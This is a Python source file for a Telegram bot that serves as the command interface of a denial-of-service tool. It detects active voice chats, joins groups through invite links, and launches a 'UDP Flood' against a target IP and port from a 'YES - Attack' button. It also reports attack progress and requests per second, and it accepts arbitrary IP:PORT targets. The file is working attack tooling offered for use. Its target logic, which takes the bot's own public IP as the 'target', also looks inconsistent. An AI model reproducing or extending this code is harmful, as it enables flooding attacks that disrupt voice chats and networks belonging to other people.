"""
Telegram Bot Handlers
Manages bot interactions and UI with invite link support
"""

import asyncio
import logging
import random
from typing import Optional
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, MessageNotModified

# Fix: Import ParseMode from pyrogram.enums
try:
    from pyrogram.enums import ParseMode
    HTML_MODE = ParseMode.HTML
except ImportError:
    HTML_MODE = "HTML"

from config import Config, ATTACK_METHODS
from utils import get_public_ip, is_valid_ip, parse_ip_port, format_number, parse_telegram_invite_link
from vc_detector import VCInfo

logger = logging.getLogger(__name__)

# State management for manual target flow
user_states = {}  # user_id -> {'state': 'waiting_for_link', 'chat_id': None, ...}


class BotHandler:
    """Manages bot commands and interactions"""
    
    def __init__(self, bot: Client, attack_engine, admin_id: int, vc_detector=None):
        self.bot = bot
        self.attack_engine = attack_engine
        self.admin_id = admin_id
        self.vc_detector = vc_detector
        self.logger = logging.getLogger(__name__)
        
        self._register_handlers()
    
    def _register_handlers(self):
        """Register all message handlers"""
        
        @self.bot.on_message(filters.command("start") & filters.private)
        async def start_handler(client, message):
            if message.from_user.id != self.admin_id:
                await message.reply_text("⛔ <b>Unauthorized Access</b>", parse_mode=HTML_MODE)
                return
            
            # Clear any pending state
            if message.from_user.id in user_states:
                del user_states[message.from_user.id]
            
            status = "🟢 <b>MONITORING</b>" if Config.MONITORING_MODE else "⚪ <b>STANDBY</b>"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 Status", callback_data="show_status"),
                 InlineKeyboardButton("🔗 Manual Target (Invite Link)", callback_data="manual_target")]
            ])
            
            text = (
                "🤖 <b>VC Monitor Bot</b>\n\n"
                f"Status: {status}\n"
                "Monitoring your Voice Chat activity...\n\n"
                "<b>How to use:</b>\n"
                "1. Join a Voice Chat in any group\n"
                "2. Bot will auto-detect and notify you\n"
                "3. Click YES to attack, or use Manual Target\n\n"
                "<b>Fixed Configuration:</b>\n"
                f"├ Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                f"├ Threads: <code>{Config.THREAD_COUNT}</code>\n"
                f"├ Timeout: <code>{Config.ATTACK_TIMEOUT}s</code>\n"
                f"└ Check Interval: <code>{Config.VC_CHECK_INTERVAL}s</code>"
            )
            
            try:
                await message.reply_text(text, reply_markup=keyboard, parse_mode=HTML_MODE)
            except Exception as e:
                self.logger.error(f"Start handler error: {e}")
        
        @self.bot.on_message(filters.command("status") & filters.private)
        async def status_handler(client, message):
            if message.from_user.id != self.admin_id:
                return
            
            try:
                status = self.attack_engine.get_status()
                
                if status['running']:
                    progress_pct = min(100, (status['progress'] / max(status['max'], 1)) * 100)
                    bar = "█" * int(progress_pct / 10) + "░" * (10 - int(progress_pct / 10))
                    
                    text = (
                        "🚀 <b>Attack In Progress</b>\n\n"
                        f"Target: <code>{status['target']}:{status['port']}</code>\n"
                        f"Progress: <code>[{bar}] {progress_pct:.1f}%</code>\n"
                        f"Requests: <code>{format_number(status['progress'])} / {format_number(status['max'])}</code>\n"
                        f"Successful: <code>{format_number(status['successful'])}</code>\n"
                        f"Failed: <code>{format_number(status['failed'])}</code>\n"
                        f"Success Rate: <code>{status['success_rate']:.2f}%</code>\n"
                        f"RPS: <code>{status['rps']:.2f}</code>\n"
                        f"Duration: <code>{status['duration']:.1f}s</code>"
                    )
                else:
                    text = (
                        "📊 <b>Status: IDLE</b>\n\n"
                        "No active attack.\n"
                        "Join a Voice Chat or use Manual Target."
                    )
                
                await message.reply_text(text, parse_mode=HTML_MODE)
            except Exception as e:
                self.logger.error(f"Status handler error: {e}")
        
        @self.bot.on_message(filters.command("stop") & filters.private)
        async def stop_handler(client, message):
            if message.from_user.id != self.admin_id:
                return
            
            try:
                if self.attack_engine.stats.is_running:
                    stats = self.attack_engine.stop_attack()
                    
                    text = (
                        "🛑 <b>Attack Stopped</b>\n\n"
                        "Final Statistics:\n"
                        f"├ Total: <code>{format_number(stats['total'])}</code>\n"
                        f"├ Success: <code>{format_number(stats['successful'])} ({stats['success_rate']:.2f}%)</code>\n"
                        f"├ Failed: <code>{format_number(stats['failed'])}</code>\n"
                        f"├ Duration: <code>{stats['duration']:.2f}s</code>\n"
                        f"└ RPS: <code>{stats['rps']:.2f}</code>"
                    )
                else:
                    text = "ℹ️ No active attack to stop."
                
                await message.reply_text(text, parse_mode=HTML_MODE)
            except Exception as e:
                self.logger.error(f"Stop handler error: {e}")
        
        @self.bot.on_callback_query(filters.regex("^attack_(.+)_(.+)_(.+)_yes$"))
        async def confirm_attack(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id:
                await callback.answer("Unauthorized!", show_alert=True)
                return
            
            try:
                data = callback.data.split("_")
                target_ip = data[1]
                target_port = int(data[2])
                
                try:
                    await callback.edit_message_text(
                        f"⏳ <b>Starting Attack...</b>\nTarget: <code>{target_ip}:{target_port}</code>",
                        parse_mode=HTML_MODE
                    )
                except MessageNotModified:
                    pass
                
                success = self.attack_engine.start_attack(target_ip, target_port, method="udp")
                
                if success:
                    try:
                        text = (
                            "🚀 <b>Attack Launched!</b>\n\n"
                            f"Target: <code>{target_ip}:{target_port}</code>\n"
                            "Method: <code>UDP Flood</code>\n"
                            f"Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                            f"Threads: <code>{Config.THREAD_COUNT}</code>\n\n"
                            "<b>Status:</b> ⚡ RUNNING\n\n"
                            "Use /status for progress\n"
                            "Use /stop to halt"
                        )
                        await callback.edit_message_text(text, parse_mode=HTML_MODE)
                    except MessageNotModified:
                        pass
                    
                    asyncio.create_task(self._monitor_attack(callback.message))
                else:
                    await callback.edit_message_text("❌ Failed to start attack.", parse_mode=HTML_MODE)
                    
            except Exception as e:
                self.logger.error(f"Confirm attack error: {e}")
                await callback.edit_message_text(f"❌ Error: {str(e)[:100]}", parse_mode=HTML_MODE)
        
        @self.bot.on_callback_query(filters.regex("^attack_cancel$"))
        async def cancel_attack(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id:
                return
            
            # Clear user state
            if callback.from_user.id in user_states:
                del user_states[callback.from_user.id]
            
            try:
                await callback.edit_message_text(
                    "❌ <b>Attack Cancelled</b>\n\n"
                    "No requests were sent.",
                    parse_mode=HTML_MODE
                )
            except Exception as e:
                self.logger.error(f"Cancel error: {e}")
        
        @self.bot.on_callback_query(filters.regex("^manual_target$"))
        async def manual_target(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id:
                return
            
            # Set user state to waiting for invite link
            user_states[callback.from_user.id] = {'state': 'waiting_for_invite_link'}
            
            try:
                await callback.edit_message_text(
    "🔗 <b>Manual Target - Invite Link</b>\n\n"
    "Send the Telegram invite link of the group where Voice Chat is active:\n\n"
    "<b>Supported formats:</b>\n"
    "• <code>https://t.me/+AbCdEfGhIjK</code> (private)\n"
    "• <code>https://t.me/groupname</code> (public)\n"
    "• <code>@groupname</code>\n\n"
    "Bot will:\n"
    "1. Join the group using invite link\n"
    "2. Check for active Voice Chat\n"
    "3. Extract target IP\n"
    "4. Ask for confirmation before attack",
    parse_mode=HTML_MODE
)
            except Exception as e:
                self.logger.error(f"Manual target error: {e}")
        
        @self.bot.on_message(filters.text & filters.private)
        async def handle_text_input(client, message):
            if message.from_user.id != self.admin_id:
                return
            
            user_id = message.from_user.id
            text = message.text.strip()
            
            # Check if user is in a specific state
            if user_id in user_states:
                state = user_states[user_id].get('state')
                
                if state == 'waiting_for_invite_link':
                    await self._process_invite_link(message, text)
                    return
            
            # Default: try to parse as IP:PORT for backward compatibility
            parsed = parse_ip_port(text)
            if parsed:
                ip, port = parsed
                await self._show_attack_confirmation(message, ip, port, "Manual IP Entry")
            elif is_valid_ip(text):
                await self._show_attack_confirmation(message, text, 80, "Manual IP Entry")
            else:
                # Ignore non-recognized messages
                pass
    
    async def _process_invite_link(self, message, link: str):
        """Process invite link and check for VC"""
        user_id = message.from_user.id
        
        # Parse the link
        chat_identifier = parse_telegram_invite_link(link)
        
        if not chat_identifier:
            await message.reply_text(
                "❌ <b>Invalid invite link format!</b>\n\n"
                "Please send a valid Telegram invite link:\n"
                "• <code>https://t.me/+AbCdEfGhIjK</code>\n"
                "• <code>https://t.me/groupname</code>\n"
                "• <code>@groupname</code>",
                parse_mode=HTML_MODE
            )
            return
        
        # Show processing message
        processing_msg = await message.reply_text(
            "⏳ <b>Processing invite link...</b>\n"
            f"Link: <code>{link}</code>\n\n"
            "Joining group and checking for Voice Chat...",
            parse_mode=HTML_MODE
        )
        
        try:
            if not self.vc_detector:
                raise Exception("VC Detector not initialized")
            
            # Resolve invite link to get chat
            result = await self.vc_detector.resolve_invite_link(link)
            
            if not result:
                await processing_msg.edit_text(
                    "❌ <b>Failed to resolve invite link!</b>\n\n"
                    "Possible reasons:\n"
                    "• Link is expired\n"
                    "• Link is invalid\n"
                    "• Bot was banned from the group\n"
                    "• Group doesn't exist",
                    parse_mode=HTML_MODE
                )
                if user_id in user_states:
                    del user_states[user_id]
                return
            
            chat_id, chat_title, invite_link = result
            
            # Check for active VC in this chat
            await processing_msg.edit_text(
                f"✅ <b>Group Found!</b>\n"
                f"Name: <code>{chat_title}</code>\n\n"
                "Checking for active Voice Chat...",
                parse_mode=HTML_MODE
            )
            
            vc_info = await self.vc_detector.get_vc_from_chat(chat_id)
            
            if not vc_info or not vc_info.is_active:
                await processing_msg.edit_text(
                    f"❌ <b>No Active Voice Chat!</b>\n\n"
                    f"Group: <code>{chat_title}</code>\n\n"
                    "There is no active Voice Chat in this group right now.\n"
                    "Please start a Voice Chat first, then try again.",
                    parse_mode=HTML_MODE
                )
                if user_id in user_states:
                    del user_states[user_id]
                return
            
            # Success! Get server IP and show confirmation
            server_ip = get_public_ip()
            
            # Store in user state
            user_states[user_id] = {
                'state': 'ready_to_attack',
                'chat_id': chat_id,
                'chat_title': chat_title,
                'vc_info': vc_info,
                'target_ip': server_ip
            }
            
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ YES - Attack", callback_data=f"attack_{server_ip}_{Config.ATTACK_PORT}_{random.randint(1000,9999)}_yes"),
                    InlineKeyboardButton("❌ Cancel", callback_data="attack_cancel")
                ]
            ])
            
            await processing_msg.edit_text(
                f"✅ <b>Voice Chat Detected!</b>\n\n"
                f"📍 <b>Group Info:</b>\n"
                f"├ Name: <code>{chat_title}</code>\n"
                f"├ VC Participants: <code>{vc_info.participants_count}</code>\n"
                f"└ Status: <code>Active</code>\n\n"
                f"🌐 <b>Target IP:</b> <code>{server_ip}</code>\n\n"
                f"⚙️ <b>Attack Configuration:</b>\n"
                f"├ Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                f"├ Threads: <code>{Config.THREAD_COUNT}</code>\n"
                f"├ Port: <code>{Config.ATTACK_PORT}</code>\n"
                f"└ Timeout: <code>{Config.ATTACK_TIMEOUT}s</code>\n\n"
                f"Do you want to send requests to <code>{server_ip}</code>?",
                reply_markup=keyboard,
                parse_mode=HTML_MODE
            )
            
        except Exception as e:
            self.logger.error(f"Error processing invite link: {e}")
            await processing_msg.edit_text(
                f"❌ <b>Error processing invite link!</b>\n\n"
                f"Error: <code>{str(e)[:200]}</code>\n\n"
                "Please try again with a different link.",
                parse_mode=HTML_MODE
            )
            if user_id in user_states:
                del user_states[user_id]
    
    async def _show_attack_confirmation(self, message, ip: str, port: int, source: str):
        """Show attack confirmation keyboard"""
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ YES - Attack", callback_data=f"attack_{ip}_{port}_{random.randint(1000,9999)}_yes"),
                InlineKeyboardButton("❌ Cancel", callback_data="attack_cancel")
            ]
        ])
        
        text = (
            f"🎯 <b>Confirm Target</b>\n"
            f"Source: <code>{source}</code>\n\n"
            f"Target IP: <code>{ip}</code>\n"
            f"Port: <code>{port}</code>\n\n"
            f"Attack Settings:\n"
            f"├ Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
            f"├ Threads: <code>{Config.THREAD_COUNT}</code>\n"
            f"└ Timeout: <code>{Config.ATTACK_TIMEOUT}s</code>\n\n"
            f"Confirm to proceed?"
        )
        
        await message.reply_text(text, reply_markup=keyboard, parse_mode=HTML_MODE)
    
    async def _monitor_attack(self, message):
        """Monitor attack and send completion message"""
        try:
            while self.attack_engine.stats.is_running:
                await asyncio.sleep(10)
            
            stats = self.attack_engine.get_status()
            
            text = (
                "✅ <b>Attack Completed</b>\n\n"
                "📊 <b>Final Statistics:</b>\n"
                f"├ Total Requests: <code>{format_number(stats['progress'])}</code>\n"
                f"├ Successful: <code>{format_number(stats['successful'])}</code>\n"
                f"├ Failed: <code>{format_number(stats['failed'])}</code>\n"
                f"├ Success Rate: <code>{stats['success_rate']:.2f}%</code>\n"
                f"├ Duration: <code>{stats['duration']:.2f}s</code>\n"
                f"└ RPS: <code>{stats['rps']:.2f}</code>\n\n"
                f"Target: <code>{stats['target']}</code>"
            )
            
            await message.reply_text(text, parse_mode=HTML_MODE)
        except Exception as e:
            self.logger.error(f"Monitor attack error: {e}")
    
    async def notify_vc_detected(self, vc_info: VCInfo):
        """Send notification when VC detected via monitoring"""
        try:
            server_ip = get_public_ip()
            unique_id = random.randint(1000, 9999)
            
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ YES - Attack", callback_data=f"attack_{server_ip}_{Config.ATTACK_PORT}_{unique_id}_yes"),
                    InlineKeyboardButton("❌ Cancel", callback_data="attack_cancel")
                ],
                [
                    InlineKeyboardButton("🔗 Manual Target (Invite Link)", callback_data="manual_target")
                ]
            ])
            
            text = (
                "🔍 <b>Voice Chat Detected!</b>\n\n"
                f"📍 <b>Group:</b> <code>{vc_info.chat_title}</code>\n"
                f"👥 <b>Participants:</b> <code>{vc_info.participants_count}</code>\n\n"
                f"🌐 <b>Target IP:</b> <code>{server_ip}</code>\n\n"
                f"⚙️ <b>Configuration:</b>\n"
                f"├ Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                f"├ Threads: <code>{Config.THREAD_COUNT}</code>\n"
                f"└ Timeout: <code>{Config.ATTACK_TIMEOUT}s</code>\n\n"
                f"Attack this target?"
            )
            
            await self.bot.send_message(
                self.admin_id,
                text,
                reply_markup=keyboard,
                parse_mode=HTML_MODE
            )
        except Exception as e:
            self.logger.error(f"Notify VC error: {e}")
